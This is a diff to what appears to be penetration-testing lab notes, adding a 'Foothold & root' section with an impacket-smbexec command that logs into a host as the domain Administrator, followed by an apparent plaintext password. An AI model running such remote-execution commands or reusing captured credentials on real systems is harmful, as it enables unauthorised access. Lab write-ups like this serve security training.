@@ -40,8 +40,10 @@ Host script results:
 |_    Message signing enabled but not required
 ```
 
+## Foothold & root
 ```
-
+impacket-smbexec "relia.com/Administrator@192.168.206.189"
+vau!XCKjNQBv2$
 ```
 
 # VM 3 .191
